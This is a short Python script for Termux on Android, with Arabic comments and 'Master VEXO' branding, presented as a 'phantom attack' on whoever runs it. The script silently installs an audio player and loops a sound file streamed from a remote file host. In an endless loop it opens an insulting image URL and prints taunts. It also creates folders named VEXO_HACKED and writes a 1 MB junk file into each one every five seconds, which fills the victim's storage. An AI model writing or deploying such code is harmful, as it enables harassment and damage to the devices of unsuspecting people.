import os
import time

# --- إعدادات Master VEXO ---
# رابط الصوت المباشر (سيعمل بمجرد التشغيل)
AUDIO_URL = "https://files.catbox.moe/9f9pzu.mp3"

def start_chaos():
    print("☣️ [VEXO SYSTEM] PHANTOM ATTACK INITIATED...")
    
    # 1. تثبيت مشغل الصوت (صامت وسريع)
    print("🔊 Initializing Audio Engine...")
    os.system("pkg install mpv -y > /dev/null 2>&1")
    
    # 2. تشغيل الصوت في الخلفية (كرار/Loop)
    # استخدام & يجعله يعمل في الخلفية لكي يكمل السكربت تخريبه
    os.system(f"mpv --loop {AUDIO_URL} > /dev/null 2>&1 &")

    # 3. حلقة الإزعاج والتخريب
    try:
        count = 1
        while True:
            print(f"🔥 Strike {count}: Target is an idiot!")
            
            # فتح الصورة المستفزة في المتصفح
            os.system("termux-open-url https://j.top4top.io/s_3763q07de1.jpg")
            
            # ملء الذاكرة بمجلدات وهمية
            os.system(f"mkdir VEXO_HACKED_{count}")
            
            # إنشاء ملفات تشغل مساحة (1 ميجا كل 5 ثوانٍ)
            os.system(f"dd if=/dev/zero of=./VEXO_HACKED_{count}/dump.dat bs=1M count=1 > /dev/null 2>&1")
            
            count += 1
            time.sleep(5) # صرخة كل 5 ثوانٍ
            
    except KeyboardInterrupt:
        # إيقاف الصوت عند الخروج
        os.system("pkill mpv")
        print("\n🛑 Stopped by Master VEXO.")

if __name__ == "__main__":
    start_chaos()
